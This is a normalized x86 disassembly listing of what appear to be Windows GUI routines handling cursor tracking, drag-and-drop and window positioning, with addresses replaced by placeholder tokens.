mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_43f5c4
test eax eax
je r-xdata
mov eax esi
call sub_43f5c4
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_438bf8
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_413d6c
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413dc8
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_43f5d8
mov edi eax
jmp r-xdata
sub_43825c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43813c
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_442598
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43818c
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43818c
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_439e90
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43818c
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581ec
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_442554
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4381c8
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403300
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_442680
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_442598
jmp r-xdata
mov eax [ rw-data ]
call sub_4426f4
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581ec
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_439e90
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403300
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403300
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407ad0
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43852c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_437758
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_442598
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43825c
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43869c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_438841
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403300
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403300
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_437a60
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43852c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_437948
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_440b28
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412910
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_439e64
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412910
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_438860
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403300
mov ebx eax
sub_4388d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_438ba0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_438b2e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_4377a0
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_438860
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43818c
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_4426f4
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438b35
mov eax [ rw-data ]
call sub_403104
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4514e0
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_43b4f4
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_438058
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45514c
sub_438b35
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403104
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_403290
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
sub_438bc4
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4371d8
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_438bf8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_438bc4
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_439e90
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_43e414
test eax eax
je r-xdata
mov esi eax
sub_438c40
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_413c10
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebx ] eax
sub_438c68
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_413eb0
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403104
xor eax eax
mov [ ebx ] eax
sub_438c88
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_438cb8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_4140d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_438d68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41413c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_438d41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_438ef4
call sub_40393c
call sub_40393c
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413d6c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d9d8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_438d74
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_4140d8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_438e12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438e19
mov eax [ rw-data ]
call sub_41413c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_438dea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_438ef4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41da34
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413d6c
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d9d8
test al al
je r-xdata
sub_438e20
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax esi
call sub_438ef4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d608
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_438e4c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41dbb8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41dbbc
mov eax [ ebp - 0x4 ]
call sub_438f40
mov eax [ rw-data ]
call sub_4140d8
mov ebx eax
xor eax eax
push ebp
push sub_438ed1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_413c10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41413c
retn
call sub_438cb8
sub_438ef4
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41dbbc
mov edx ebx
mov eax [ rw-data ]
call sub_4140ec
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_438f40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43a984
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_438f6c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_438fa8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41440c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_438ff0
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4390ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_439179
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439180
lea eax [ ebp - 0x1c ]
call sub_403e54
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403300
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_449c5c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408be0
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403ea8
sub_43919c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439203
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_446870
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43a34c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov edx [ eax + 0x64 ]
pop eax
call sub_404260
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43920a
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov al 0x1
sub_439210
push ebx
mov ebx eax
mov eax ebx
call sub_446898
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_439244
push ebx
mov ebx eax
mov eax ebx
call sub_4468e8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404260
je r-xdata
mov al 0x1
pop ebx
retn
sub_43927c
push ebx
mov ebx eax
mov eax ebx
call sub_446924
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4392b0
push ebx
mov ebx eax
mov eax ebx
call sub_41a144
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4392d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43a37c
sub_4392f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_439318
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403ea8
sub_43933c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43a26c
sub_43935c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
